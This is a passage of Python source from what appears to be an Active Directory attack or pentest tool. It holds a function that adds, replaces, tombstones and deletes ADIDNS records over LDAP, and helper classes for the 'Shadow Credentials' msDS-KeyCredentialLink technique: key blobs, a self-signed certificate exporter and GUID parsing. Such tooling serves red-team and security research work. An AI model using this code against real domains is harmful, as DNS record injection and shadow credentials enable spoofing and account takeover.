		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def manageRecord(conn, server, target, signing, ldaps, startTLS, channelBinding, username, domain, aesKey, ccache, action, dnsPartition = '', zone = '', entryName = '', recordIndex = '', recordValue = ''):
	print_yellow("[*] Managing ADIDNS Records")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		# Choose the right distinguishedName base on provided DNS Partition

		if dnsPartition == "Domain":
			domainRootDN = server.info.other['defaultNamingContext'][0]
			domainBaseDN = f"CN=MicrosoftDNS,DC=DomainDnsZones,{domainRootDN}"
			baseDN = f"DC={zone},{domainBaseDN}"
		elif dnsPartition == "Legacy":
			legacyBaseDN = f"CN=MicrosoftDNS,CN=System,{domainRootDN}"
			baseDN = f"DC={zone},{legacyBaseDN}"
		else: # Forest
			forestRootDN = server.info.other['rootDomainNamingContext'][0]
			forestBaseDN = f"CN=MicrosoftDNS,DC=ForestDnsZones,{forestRootDN}"
			baseDN = f"DC={zone},{forestBaseDN}"

		global PAGED_SIZE

		if dnsPartition == "Forest" and forestRootDN != domainRootDN and (ccache != None or aesKey != None): # ST is required
			targetDomain = ('.'.join([x.strip("DC=") for x in forestRootDN.split(",")])).lower()
			
			# We need the PDC FQDN for the target domain to request a valid SPN
			# Find It by querying SRV record for '_ldap._tcp.pdc._msdcs.<FQDN>' through UDP and TCP
			try:
				kdcHost = str(dns.resolver.resolve(f"_ldap._tcp.pdc._msdcs.{targetDomain}", "SRV", tcp = False)[0].target)[:-1]
			except:
				try:
					kdcHost = str(dns.resolver.resolve(f"_ldap._tcp.pdc._msdcs.{targetDomain}", "SRV", tcp = True)[0].target)[:-1]
				except:
					foundKDCHost = False
			
			if not foundKDCHost:
				print(f"[-] Could not find PDC FQDN for root forest domain {targetDomain.upper()}", file = sys.stderr)
				return

			print(f"[+] Connecting with Kerberos to {targetDomain.upper()} for Forest DNS partition")
			originalSTDOUT = sys.stdout
			sys.stdout = StringIO()
			conn, server = connect_ldap(kdcHost, signing, ldaps, startTLS, channelBinding, username, '', '', domain, aesKey, ccache, None, None, None)
			sys.stdout = originalSTDOUT
			if conn == '':
				return
		
		# Search the target entry

		targetEntry = None
		entry_generator = search(conn, server, baseDN = baseDN, filter = f"(name={entryName})", attributes = ["dnsRecord", "dNSTombstoned", "distinguishedName"])
		i = 0
		for entry in entry_generator:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				targetEntry = entry
				break

		entryDN = f"DC={entryName},{baseDN}"
		
		# Apply requested action

		if action == 'QUERY': # Query entry

			print(f"[+] Querying records of entry '{entryName}' from zone '{zone}'")

			if targetEntry != None:
				dnsRecordsRaw = entry["raw_attributes"]["dnsRecord"]
				tombstoned = entry["raw_attributes"]["dNSTombstoned"]
				print(f"\t[+] {entryName}")
				if tombstoned != []:
					tombstoned = True if tombstoned[0].decode() == "TRUE" else False
				else:
					tombstoned = "<Unknown>"
				print(f"\t\t[+] Entry Tombstoned = {tombstoned}")

				if dnsRecordsRaw != []:
					for idx, dnsRecordRaw in enumerate(dnsRecordsRaw):
						print(f"\t\t----- Record {idx} -----")
						dnsRecord = DNS_RECORD(dnsRecordRaw)
						printRecord(dnsRecord)
				else:
					print("\t\t[-] No access or empty", file = sys.stderr)
			else:
				print(f"[-] DNS entry '{entryName}' not found or user does not have read rights", file = sys.stderr)
		
		elif action == 'ADD': # Add record

			print(f"[+] Add A record '{recordValue}' into entry '{entryName}' from zone '{zone}'")
					
			if targetEntry != None: # Entry exists, add the provided record value
				entryDN = targetEntry["raw_attributes"]["distinguishedName"][0].decode()
				nextSerial = getNextSerial(zone)
				if nextSerial == 0:
					print("[-] Failed to get next serial number", file = sys.stderr)
					return
				record = newRecord(1, nextSerial)
				record['Data'] = DNS_RPC_RECORD_A()
				record['Data'].fromCanonical(recordValue)
				conn.modify(entryDN, {'dnsRecord': [(MODIFY_ADD, record.getData())]})

			else: # Entry does not exists, create It

				print(f"[+] DNS entry '{entryName}' not exists or user does not have read rights. Try to creating one")

				nodeData = {
					'objectCategory': f"CN=Dns-Node,{server.info.other['schemaNamingContext'][0]}",
					'dNSTombstoned': False,
					'name': entryName
				}
				nextSerial = getNextSerial(zone)
				if nextSerial == 0:
					print("[-] Failed to get next serial number", file = sys.stderr)
					return
				record = newRecord(1, nextSerial)
				record['Data'] = DNS_RPC_RECORD_A()
				record['Data'].fromCanonical(recordValue)
				nodeData['dnsRecord'] = [record.getData()]
				conn.add(entryDN, ['top', 'dnsNode'], nodeData)
			
			if conn.result['result'] == 0:
				print(f"[+] Done")
			else:
				print(f"[-] Failed to add record: {conn.result}")

		elif action == 'REPLACE': # Replace a record

			print(f"[+] Replace record {recordIndex} into entry '{entryName}' from zone '{zone}'")
					
			if targetEntry != None: # Entry exists, search if It contains record at requested index
				targetRecord = None
				records = []
				for idx, record in enumerate(targetEntry['raw_attributes']['dnsRecord']):
					dr = DNS_RECORD(record)
					if idx == int(recordIndex):
						targetRecord = dr
						record = newRecord(1, dr['Serial'])
						record['Data'] = DNS_RPC_RECORD_A()
						record['Data'].fromCanonical(recordValue)
						records.append(record.getData())
					else:
						records.append(record)
				if not targetRecord:
					print(f"[-] No record found in entry '{entryName}' at index {recordIndex}", file = sys.stderr)
					return
				else:
					entryDN = targetEntry["raw_attributes"]["distinguishedName"][0].decode()
					conn.modify(entryDN, {'dnsRecord': [(MODIFY_REPLACE, records)]})
				
				if conn.result['result'] == 0:
					print(f"[+] Done")
				else:
					print(f"[-] Failed to replace record: {conn.result}")

			else:
				print(f"[-] DNS entry '{entryName}' not found or user does not have read rights", file = sys.stderr)

		elif action == 'REMOVE': # Remove the record or tombstoned It

			print(f"[+] Remove record {recordIndex} into entry '{entryName}' from zone '{zone}'")

			if targetEntry != None: # Entry exists
				
				targetRecord = None
				for idx, record in enumerate(targetEntry['raw_attributes']['dnsRecord']):
					if idx == int(recordIndex):
						targetRecord = record
				if not targetRecord:
					print(f"[-] No record found in entry '{entryName}' at index {recordIndex}", file = sys.stderr)
					return
				else:
					if len(targetEntry["raw_attributes"]["dnsRecord"]) > 1: # Multiple records, delete the record at index
					
						entryDN = targetEntry["raw_attributes"]["distinguishedName"][0].decode()
						conn.modify(entryDN, {'dnsRecord': [(MODIFY_DELETE, targetRecord)]})
					
					else: # Target entry has only one record, tombstoned It

						diff = datetime.datetime.today() - datetime.datetime(1601,1,1)
						tstime = int(diff.total_seconds()*10000)
						nextSerial = getNextSerial(zone)
						if nextSerial == 0:
							print("[-] Failed to get next serial number", file = sys.stderr)
							return
						record = newRecord(0, nextSerial)
						record['Data'] = DNS_RPC_RECORD_TS()
						record['Data']['entombedTime'] = tstime
						entryDN = targetEntry["raw_attributes"]["distinguishedName"][0].decode()
						conn.modify(entryDN, {'dnsRecord': [(MODIFY_REPLACE, [record.getData()])], 'dNSTombstoned': [(MODIFY_REPLACE, True)]})

					if conn.result['result'] == 0:
						print(f"[+] Done")
					else:
						print(f"[-] Failed to remove record: {conn.result}")

			else:
				print(f"[-] DNS entry '{entryName}' not found or user does not have read rights", file = sys.stderr)

		elif action == 'DELETE': # Delete the DNS entry

			print(f"[+] Remove entry '{entryName}' from zone '{zone}'")

			if targetEntry != None:
				entryDN = targetEntry["raw_attributes"]["distinguishedName"][0].decode()
				conn.delete(entryDN)

				if conn.result['result'] == 0:
					print(f"[+] Done")
				else:
					print(f"[-] Failed to delete entry: {conn.result}")

			else:
				print(f"[-] DNS entry '{entryName}' not found or user does not have read rights", file = sys.stderr)

		elif action == 'RESURRECT': # Resurrect record

			print(f"[+] Resurrect entry '{entryName}' from zone '{zone}'")

			if targetEntry != None: # Entry exists

				if len(targetEntry["raw_attributes"]["dnsRecord"]) > 1: # Multiple records found
					print(f"[-] Multiple records found for DNS entry '{entryName}'", file = sys.stderr)

				else: # Target entry has only one record, resurrect It

					if int(recordIndex) != 0:
						print(f"[-] No record found in entry '{entryName}' at index {recordIndex}", file = sys.stderr)
						return

					diff = datetime.datetime.today() - datetime.datetime(1601,1,1)
					tstime = int(diff.total_seconds()*10000)
					nextSerial = getNextSerial(zone)
					if nextSerial == 0:
						print("[-] Failed to get next serial number", file = sys.stderr)
						return
					record = newRecord(0, nextSerial)
					record['Data'] = DNS_RPC_RECORD_TS()
					record['Data']['entombedTime'] = tstime
					entryDN = targetEntry["raw_attributes"]["distinguishedName"][0].decode()
					conn.modify(entryDN, {'dnsRecord': [(MODIFY_REPLACE, [record.getData()])], 'dNSTombstoned': [(MODIFY_REPLACE, False)]})

					if conn.result['result'] == 0:
						print(f"[+] Done")
					else:
						print(f"[-] Failed to resurrect record: {conn.result}")

			else:
				print(f"[-] DNS entry '{entryName}' not found or user does not have read rights", file = sys.stderr)

		else:
			print(f"[-] Unsupported action '{action}'", file = sys.stderr)

	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

###################################################################################
#                     Shadow Creds (msDS-KeyCredentialLink)                       #
###################################################################################

class RSAKeyMaterial(object):
	"""
	RsaKeyMaterial

	See:
	https://docs.microsoft.com/en-us/archive/msdn-magazine/2007/july/applying-cryptography-using-the-cng-api-in-windows-vista
	https://docs.microsoft.com/en-us/archive/msdn-magazine/2007/july/images/cc163389.fig11.gif
	https://docs.microsoft.com/en-us/windows/win32/api/bcrypt/ns-bcrypt-bcrypt_rsakey_blob
	"""

	def __init__(self, modulus: int, exponent: int, keySize: int, prime1: int = 0, prime2: int = 0):
		super(RSAKeyMaterial, self).__init__()
		if prime1 != 0 and prime2 != 0:
			try:
				assert((prime1 * prime2) == modulus)
			except AssertionError as e:
				raise ValueError("Modulus (N) does not match result of prime1 (p) * prime2 (q).")
		self.modulus = self.n = modulus
		self.exponent = self.e = exponent
		self.prime1 = self.p = prime1
		self.prime2 = self.q = prime2
		self.keySize = keySize
		# self.key = RSA.construct((self.modulus, self.exponent, None, self.prime1, self.prime2, None))


	@classmethod
	def fromRawBytes(cls, rawBytes: bytes):
		stream_data = io.BytesIO(rawBytes)
		# Parsing header
		blobType = stream_data.read(4)
		keySize = struct.unpack('<I', stream_data.read(4))[0]
		exponentSize = struct.unpack('<I', stream_data.read(4))[0]
		modulusSize = struct.unpack('<I', stream_data.read(4))[0]
		prime1Size = struct.unpack('<I', stream_data.read(4))[0]
		prime2Size = struct.unpack('<I', stream_data.read(4))[0]

		# Parsing body
		exponent = bytes_to_long(stream_data.read(exponentSize))
		modulus = bytes_to_long(stream_data.read(modulusSize))
		prime1 = bytes_to_long(stream_data.read(prime1Size))
		prime2 = bytes_to_long(stream_data.read(prime2Size))

		return RSAKeyMaterial(modulus, exponent, keySize, prime1=prime1, prime2=prime2)

	def toRawBytes(self):
		b_blobType = b'RSA1'
		b_keySize = struct.pack('<I', self.keySize)

		b_exponent = long_to_bytes(self.exponent)
		b_exponentSize = struct.pack('<I', len(b_exponent))

		b_modulus = long_to_bytes(self.modulus)
		b_modulusSize = struct.pack('<I', len(b_modulus))

		if self.prime1 == 0:
			b_prime1Size = struct.pack('<I', 0)
		else:
			b_prime1 = long_to_bytes(self.prime1)
			b_prime1Size = struct.pack('<I', len(b_prime1))

		if self.prime2 == 0:
			b_prime2Size = struct.pack('<I', 0)
		else:
			b_prime2 = long_to_bytes(self.prime2)
			b_prime2Size = struct.pack('<I', len(b_prime2))

		# Header
		data = b_blobType
		# Header
		data += b_keySize
		data += b_exponentSize + b_modulusSize + b_prime1Size + b_prime2Size
		# Content
		data += b_exponent + b_modulus
		if self.prime1 != 0:
			data += b_prime1
		if self.prime2 != 0:
			data += b_prime2
		return data

	def toDict(self):
		keyMaterialDict = {
			"modulus": self.modulus,
			"exponent": self.exponent,
			"prime1": self.prime1,
			"prime2": self.prime2,
			"keySize": self.keySize
		}
		return keyMaterialDict


	@classmethod
	def fromDict(cls, data):
		modulus = data["modulus"]
		exponent = data["exponent"]
		keySize = data["keySize"]
		prime1 = data["prime1"]
		prime2 = data["prime2"]
		keyMaterial = cls(modulus, exponent, keySize, prime1, prime2)
		return keyMaterial


	def show(self):
		print("<RsaKeyMaterial at 0x%x>" % id(self))
		print(" | Exponent (E): %s" % hex(self.exponent))
		print(" | Modulus (N): %s" % hex(self.modulus))
		print(" | Prime1 (P): %s" % hex(self.prime1))
		print(" | Prime2 (Q): %s" % hex(self.prime2))

class X509Certificate2(object):
	"""
	class X509Certificate2
	"""

	def __init__(self, subject, keySize=2048, notBefore=0, notAfter=365):
		self.key = None

		# Create rsa key pair object
		self.key = OpenSSL.crypto.PKey()
		# Generate key pair or 2048 of length
		self.key.generate_key(OpenSSL.crypto.TYPE_RSA, keySize)
		# Create x509 certificate object
		self.certificate = OpenSSL.crypto.X509()

		# Set cert params
		self.certificate.get_subject().CN = subject
		self.certificate.set_issuer(self.certificate.get_subject())
		# Validity
		self.certificate.gmtime_adj_notBefore(notBefore * 24 * 60 * 60)
		self.certificate.gmtime_adj_notAfter(notAfter * 24 * 60 * 60)

		self.certificate.set_pubkey(self.key)

		# Self-sign certificate with SHA256 digest and PKCS1 padding scheme
		self.certificate.sign(self.key, "sha256")

		pem_key = OpenSSL.crypto.dump_publickey(OpenSSL.crypto.FILETYPE_PEM, self.key)
		pubkey = RSA.importKey(pem_key)
		self.publicKey = RSAKeyMaterial(
			modulus=pubkey.n,
			exponent=pubkey.e,
			keySize=pubkey.size_in_bits(),
			prime1=0,
			prime2=0
		)

	def ExportPFX(self, path_to_file, password):
		if len(os.path.dirname(path_to_file)) != 0:
			if not os.path.exists(os.path.dirname(path_to_file)):
				os.makedirs(os.path.dirname(path_to_file), exist_ok=True)
		pk = OpenSSL.crypto.PKCS12()
		pk.set_privatekey(self.key)
		pk.set_certificate(self.certificate)
		with open(path_to_file + ".pfx", "wb") as f:
			f.write(pk.export(passphrase=password))

	def ExportPEM(self, path_to_files):
		if len(os.path.dirname(path_to_files)) != 0:
			if not os.path.exists(os.path.dirname(path_to_files)):
				os.makedirs(os.path.dirname(path_to_files), exist_ok=True)
		cert = OpenSSL.crypto.dump_certificate(OpenSSL.crypto.FILETYPE_PEM, self.certificate)
		with open(path_to_files + "_cert.pem", "wb") as f:
			f.write(cert)
		privpem = OpenSSL.crypto.dump_privatekey(OpenSSL.crypto.FILETYPE_PEM, self.key)
		with open(path_to_files + "_priv.pem", "wb") as f:
			f.write(privpem)

	def ExportRSAPublicKeyDER(self):
		raise NotImplementedError("")

	def ExportRSAPublicKeyBCrypt(self):
		return self.publicKey

class KeyCredentialVersion(Enum):
	"""
	Key Credential Link Blob Structure Version

	See: https://msdn.microsoft.com/en-us/library/mt220501.aspx
	"""
	Version0 = 0x0

	Version1 = 0x00000100

	Version2 = 0x00000200

class KeyUsage(Enum):
	"""
	Key Usage

	See: https://msdn.microsoft.com/en-us/library/mt220501.aspx
	"""

	# Admin key (pin-reset key)
	AdminKey = 0

	# NGC key attached to a user object (KEY_USAGE_NGC)
	NGC = 0x01

	# Transport key attached to a device object
	STK = 0x02

	# BitLocker recovery key
	BitlockerRecovery = 0x03

	# Unrecognized key usage
	Other = 0x04

	# Fast IDentity Online Key (KEY_USAGE_FIDO)
	FIDO = 0x07

	# File Encryption Key (KEY_USAGE_FEK)
	FEK = 0x08

	# DPAPI Key
	# TODO: The DPAPI enum needs to be mapped to a proper integer value.

class KeySource(Enum):
	"""
	Key Source

	See: https://msdn.microsoft.com/en-us/library/mt220501.aspx
	"""
	# On Premises Key Trust
	AD = 0x00

	# Hybrid Azure AD Key Trust
	AzureAD = 0x01

class KeyFlags(Enum):
	"""
	Custom Key Flags

	See: https://msdn.microsoft.com/en-us/library/mt220496.aspx
	"""

	# No flags specified
	NONE = 0

	# Reserved for future use (CUSTOMKEYINFO_FLAGS_ATTESTATION)
	Attestation = 0x01

	# During creation of this key, the requesting client authenticated using
	# only a single credential (CUSTOMKEYINFO_FLAGS_MFA_NOT_USED)
	MFANotUsed = 0x02

class CustomKeyInformationVolumeType(Enum):
	"""
	Specifies the volume type.

	See: https://msdn.microsoft.com/en-us/library/mt220496.aspx
	"""

	# Volume not specified
	NONE = 0x00

	# Operating system volume (OSV)
	OperatingSystem = 0x01

	# Fixed data volume (FDV)
	Fixed = 0x02

	# Removable data volume (RDV)
	Removable = 0x03

class KeyStrength(Enum):
	"""
	Specifies the strength of the NGC key.

	See: https://msdn.microsoft.com/en-us/library/mt220496.aspx
	"""

	# Key strength is unknown
	Unknown = 0x00

	# Key strength is weak
	Weak = 0x01

	# Key strength is normal
	Normal = 0x02

class CustomKeyInformation(dict):
	"""
	Represents the CUSTOM_KEY_INFORMATION structure.

	See:  https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/701a55dc-d062-4032-a2da-dbdfc384c8cf
	"""

	Version: int = 0
	Flags: KeyFlags = KeyFlags.NONE
	CurrentVersion: int = 1

	ShortRepresentationSize: int = 2
	ReservedSize: int = 10

	VolumeType: CustomKeyInformationVolumeType = None

	# Specifies whether the device associated with this credential supports notification
	SupportsNotification: bool = None

	# Specifies the version of the File Encryption Key (FEK)
	FekKeyVersion: bytes = None

	# Specifies the strength of the NGC key
	Strength: KeyStrength = None

	# Reserved for future use
	Reserved: bytes = None

	# Extended custom key information
	EncodedExtendedCKI: bytes = None

	def __init__(self, flags=KeyFlags.NONE):
		super(CustomKeyInformation, self).__init__()
		self.Version = self.CurrentVersion
		self.Flags = flags
		self["Version"] = self.Version
		self["Flags"] = self.Flags

	@classmethod
	def fromBlob(self, blob: bytes, version):
		# Validate the input
		assert (len(blob) >= self.ShortRepresentationSize)

		self = CustomKeyInformation()

		stream_data = io.BytesIO(blob)
		# An 8-bit unsigned integer that must be set to 1:
		self.Version = None
		self.Version = struct.unpack('<B', stream_data.read(1))[0]
		self["Version"] = self.Version

		# An 8-bit unsigned integer that specifies zero or more bit-flag values
		self.Flags = None
		self.Flags = KeyFlags(struct.unpack('<B', stream_data.read(1))[0])
		self["Flags"] = self.Flags

		# Note: This structure has two possible representations.
		# In the first representation, only the Version and Flags fields are
		# present; in this case the structure has a total size of two bytes.
		# In the second representation, all additional fields shown below are
		# also present; in this case, the structure's total size is variable.
		# Differentiating between the two representations must be inferred using
		# only the total size.

		# An 8-bit unsigned integer that specifies one of the volume types
		data = stream_data.read(1)
		if len(data) != 0:
			self.VolumeType = struct.unpack('<B', data)[0]
		else:
			self.VolumeType = None
		self["VolumeType"] = self.VolumeType

		# An 8-bit unsigned integer that specifies whether the device associated with this credential supports notification
		data = stream_data.read(1)
		if len(data) != 0:
			self.SupportsNotification = bool(struct.unpack('<B', data)[0]);
		else:
			self.SupportsNotification = None
		self["SupportsNotification"] = self.SupportsNotification

		# An 8-bit unsigned integer that specifies the version of the
		# File Encryption Key (FEK). This field must be set to 1
		data = stream_data.read(1)
		if len(data) != 0:
			self.FekKeyVersion = struct.unpack('<B', data)[0]
		else:
			self.FekKeyVersion = None
		self["FekKeyVersion"] = self.FekKeyVersion

		# An 8-bit unsigned integer that specifies the strength of the NGC key
		data = stream_data.read(1)
		if len(data) != 0:
			self.Strength = struct.unpack('<B', data)[0]
		else:
			self.Strength = None
		self["Strength"] = self.Strength

		# 10 bytes reserved for future use
		# Note: With FIDO, Azure incorrectly puts here 9 bytes instead of 10
		data = stream_data.read(10)
		if len(data) != 0:
			self.Reserved = data.ljust(10, b"\x00")
		else:
			self.Reserved = None
		self["Reserved"] = self.Reserved

		# Extended custom key information
		data = stream_data.read()
		if len(data) != 0:
			self.EncodedExtendedCKI = data
		else:
			self.EncodedExtendedCKI = None
		self["EncodedExtendedCKI"] = self.EncodedExtendedCKI
		return self


	def toDict(self):
		CustomKeyInformationDict = {
			'Version': self.Version,
			'Flags': self.Flags.value,
			'VolumeType': self.VolumeType,
			'SupportsNotification': self.SupportsNotification,
			'FekKeyVersion': self.FekKeyVersion,
			'Strength': self.Strength,
			'Reserved': self.Reserved,
			'EncodedExtendedCKI': self.EncodedExtendedCKI
		}
		return CustomKeyInformationDict

	@classmethod
	def fromDict(cls, data):
		cki = cls(flags=KeyFlags(data["Flags"]))
		cki.Version = data["Version"]
		cki.VolumeType = CustomKeyInformationVolumeType(data["VolumeType"]) if data["VolumeType"] is not None else None
		cki.SupportsNotification = data["SupportsNotification"]
		cki.Strength = data["Strength"]
		cki.FekKeyVersion = data["FekKeyVersion"]
		cki.Reserved = data["Reserved"]
		cki.EncodedExtendedCKI = data["EncodedExtendedCKI"]
		cki["Version"] = cki.Version
		cki["VolumeType"] = cki.VolumeType
		cki["SupportsNotification"] = cki.SupportsNotification
		cki["FekKeyVersion"] = cki.FekKeyVersion
		cki["Strength"] = cki.Strength
		cki["Reserved"] = cki.Reserved
		cki["EncodedExtendedCKI"] = cki.EncodedExtendedCKI
		return cki


	def toByteArray(self) -> bytes:
		stream_data = b""
		stream_data += struct.pack("<B", self.Version)
		stream_data += struct.pack("<B", self.Flags.value)

		if self.VolumeType is not None:
			stream_data += struct.pack("<B", self.VolumeType.value)

		if self.SupportsNotification is not None:
			stream_data += struct.pack("<B", self.SupportsNotification)

		if self.FekKeyVersion is not None:
			stream_data += self.FekKeyVersion
			# stream_data += struct.pack("<B", self.FekKeyVersion.value)

		if self.Strength is not None:
			stream_data += struct.pack("<B", self.Strength.value)

		if self.Reserved is not None:
			stream_data += self.Reserved.ljust(10, b"\x00")

		if self.EncodedExtendedCKI is not None:
			stream_data += self.EncodedExtendedCKI

		return stream_data

	def __repr__(self):
		return "<CustomKeyInformation at 0x%x>" % id(self)

class GuidFormat(Enum):
	"""
	N => 32 digits : 00000000000000000000000000000000
	D => 32 digits separated by hyphens : 00000000-0000-0000-0000-000000000000
	B => 32 digits separated by hyphens, enclosed in braces : {00000000-0000-0000-0000-000000000000}
	P => 32 digits separated by hyphens, enclosed in parentheses : (00000000-0000-0000-0000-000000000000)
	X => Four hexadecimal values enclosed in braces, where the fourth value is a subset of eight hexadecimal values that is also enclosed in braces : {0x00000000,0x0000,0x0000,{0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}}
	"""
	N = 0
	D = 1
	B = 2
	P = 3
	X = 4

class GuidImportFormatPattern(Enum):
	"""
	N => 32 digits : 00000000000000000000000000000000
	D => 32 digits separated by hyphens : 00000000-0000-0000-0000-000000000000
	B => 32 digits separated by hyphens, enclosed in braces : {00000000-0000-0000-0000-000000000000}
	P => 32 digits separated by hyphens, enclosed in parentheses : (00000000-0000-0000-0000-000000000000)
	X => Four hexadecimal values enclosed in braces, where the fourth value is a subset of eight hexadecimal values that is also enclosed in braces : {0x00000000,0x0000,0x0000,{0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}}
	"""
	N = "^([0-9a-f]{8})([0-9a-f]{4})([0-9a-f]{4})([0-9a-f]{2})([0-9a-f]{2})([0-9a-f]{2})([0-9a-f]{2})([0-9a-f]{2})([0-9a-f]{2})([0-9a-f]{2})([0-9a-f]{2})$"
	D = "^([0-9a-f]{8})-([0-9a-f]{4})-([0-9a-f]{4})-([0-9a-f]{4})-([0-9a-f]{12})$"
	B = "^{([0-9a-f]{8})-([0-9a-f]{4})-([0-9a-f]{4})-([0-9a-f]{4})-([0-9a-f]{12})}$"
	P = "^\\(([0-9a-f]{8})-([0-9a-f]{4})-([0-9a-f]{4})-([0-9a-f]{4})-([0-9a-f]{12})\\)$"
	X = "^{0x([0-9a-f]{8}),0x([0-9a-f]{4}),0x([0-9a-f]{4}),{0x([0-9a-f]{2}),0x([0-9a-f]{2}),0x([0-9a-f]{2}),0x([0-9a-f]{2}),0x([0-9a-f]{2}),0x([0-9a-f]{2}),0x([0-9a-f]{2}),0x([0-9a-f]{2})}}$"

class InvalidGuidFormat(Exception):
	pass

class Guid(object):
	"""
	Guid

	See: https://docs.microsoft.com/en-us/dotnet/api/system.guid?view=net-5.0
	"""

	Format: GuidFormat = None

	def __init__(self, a=None, b=None, c=None, d=None, e=None):
		super(Guid, self).__init__()
		if a is None:
			a = sum([random.randint(0, 0xff) << (8*k) for k in range(4)])
		if b is None:
			b = sum([random.randint(0, 0xff) << (8*k) for k in range(2)])
		if c is None:
			c = sum([random.randint(0, 0xff) << (8*k) for k in range(2)])
		if d is None:
			d = sum([random.randint(0, 0xff) << (8*k) for k in range(2)])
		if e is None:
			e = sum([random.randint(0, 0xff) << (8*k) for k in range(6)])
		self.a, self.b, self.c, self.d, self.e = a, b, c, d, e

	@classmethod
	def load(cls, data):
		self = None

		if type(data) == bytes and len(data) == 16:
			return Guid.fromRawBytes(data)

		elif type(data) == str:
			matched = re.match(GuidImportFormatPattern.X.value, data, re.IGNORECASE)
			if matched is not None:
				self = cls.fromFormatX(matched.group(0))
				self.Format = GuidFormat.X
				return self

			matched = re.match(GuidImportFormatPattern.P.value, data, re.IGNORECASE)
			if matched is not None:
				self = cls.fromFormatP(matched.group(0))
				self.Format = GuidFormat.P
				return self

			matched = re.match(GuidImportFormatPattern.D.value, data, re.IGNORECASE)
			if matched is not None:
				self = cls.fromFormatD(matched.group(0))
				self.Format = GuidFormat.D
				return self

			matched = re.match(GuidImportFormatPattern.B.value, data, re.IGNORECASE)
			if matched is not None:
				self = cls.fromFormatB(matched.group(0))
				self.Format = GuidFormat.B
				return self

			matched = re.match(GuidImportFormatPattern.N.value, data, re.IGNORECASE)
			if matched is not None:
				self = cls.fromFormatN(matched.group(0))
				self.Format = GuidFormat.N
				return self

		return self

	# Import formats

	@classmethod
	def fromRawBytes(cls, data: bytes):
		if len(data) != 16:
			raise InvalidGuidFormat("fromRawBytes takes exactly 16 bytes of data in input")
		# 0xffffff
		a = struct.unpack("<L", data[0:4])[0]
		# 0xffff
		b = struct.unpack("<H", data[4:6])[0]
		# 0xffff
		c = struct.unpack("<H", data[6:8])[0]
		# 0xffff
		d = struct.unpack(">H", data[8:10])[0]
		# 0xffffffffffff
		e = binascii.hexlify(data[10:16]).decode("UTF-8").rjust(6, '0')
		e = int(e, 16)
		self = cls(a, b, c, d, e)
		return self

	@classmethod
	def fromFormatN(cls, data):
		# N => 32 digits : 00000000000000000000000000000000
		if not re.match(GuidImportFormatPattern.N.value, data, re.IGNORECASE):
			raise InvalidGuidFormat("Guid Format N should be 32 hexadecimal characters separated in five parts.")
		a = int(data[0:8], 16)
		b = int(data[8:12], 16)
		c = int(data[12:16], 16)
		d = int(data[16:20], 16)
		e = int(data[20:32], 16)
		self = cls(a, b, c, d, e)
		return self

	@classmethod
	def fromFormatD(cls, data):
		# D => 32 digits separated by hyphens :
		# 00000000-0000-0000-0000-000000000000
		if not re.match(GuidImportFormatPattern.D.value, data, re.IGNORECASE):
			raise InvalidGuidFormat("Guid Format D should be 32 hexadecimal characters separated in five parts.")
		a, b, c, d, e = map(lambda x: int(x, 16), data.split("-"))
		self = cls(a, b, c, d, e)
		return self

	@classmethod
	def fromFormatB(cls, data):
		# B => 32 digits separated by hyphens, enclosed in braces :
		# {00000000-0000-0000-0000-000000000000}
		if not re.match(GuidImportFormatPattern.B.value, data, re.IGNORECASE):
			raise InvalidGuidFormat("Guid Format B should be 32 hexadecimal characters separated in five parts enclosed in braces.")
		a, b, c, d, e = map(lambda x: int(x, 16), data[1:-1].split("-"))
		self = cls(a, b, c, d, e)
		return self

	@classmethod
	def fromFormatP(cls, data):
		# P => 32 digits separated by hyphens, enclosed in parentheses :
		# (00000000-0000-0000-0000-000000000000)
		if not re.match(GuidImportFormatPattern.P.value, data, re.IGNORECASE):
			raise InvalidGuidFormat("Guid Format P should be 32 hexadecimal characters separated in five parts enclosed in parentheses.")
		a, b, c, d, e = map(lambda x: int(x, 16), data[1:-1].split("-"))
		self = cls(a, b, c, d, e)
		return self

	@classmethod
	def fromFormatX(cls, data):
		# X => Four hexadecimal values enclosed in braces, where the fourth value is a subset of
		# eight hexadecimal values that is also enclosed in braces :
		# {0x00000000,0x0000,0x0000,{0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}}
		if not re.match(GuidImportFormatPattern.X.value, data, re.IGNORECASE):
			raise InvalidGuidFormat("Guid Format X should be in this format {0x00000000,0x0000,0x0000,{0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}}.")
		hex_a, hex_b, hex_c, rest = data[1:-1].split(',', 3)
		rest = rest[1:-1].split(',')
		a = int(hex_a, 16)
		b = int(hex_b, 16)
		c = int(hex_c, 16)
		d = int(rest[0], 16) * 0x100 + int(rest[1], 16)
		e = int(rest[2], 16) * (0x1 << (8 * 5))
		e += int(rest[3], 16) * (0x1 << (8 * 4))
		e += int(rest[4], 16) * (0x1 << (8 * 3))
		e += int(rest[5], 16) * (0x1 << (8 * 2))
		e += int(rest[6], 16) * (0x1 << 8)
		e += int(rest[7], 16)
		self = cls(a, b, c, d, e)
		return self

	# Export formats

	def toRawBytes(self):
		data = b''
		data += struct.pack("<L", self.a)
		data += struct.pack("<H", self.b)
		data += struct.pack("<H", self.c)
		data += struct.pack(">H", self.d)
		data += binascii.unhexlify(hex(self.e)[2:].rjust(12, '0'))
		return data

	def toFormatN(self) -> str:
		# N => 32 digits :
		# 00000000000000000000000000000000
		hex_a = hex(self.a)[2:].rjust(8, '0')
		hex_b = hex(self.b)[2:].rjust(4, '0')
		hex_c = hex(self.c)[2:].rjust(4, '0')
		hex_d = hex(self.d)[2:].rjust(4, '0')
		hex_e = hex(self.e)[2:].rjust(12, '0')
		return "%s%s%s%s%s" % (hex_a, hex_b, hex_c, hex_d, hex_e)

	def toFormatD(self) -> str:
		# D => 32 digits separated by hyphens :
		# 00000000-0000-0000-0000-000000000000
		hex_a = hex(self.a)[2:].rjust(8, '0')
		hex_b = hex(self.b)[2:].rjust(4, '0')
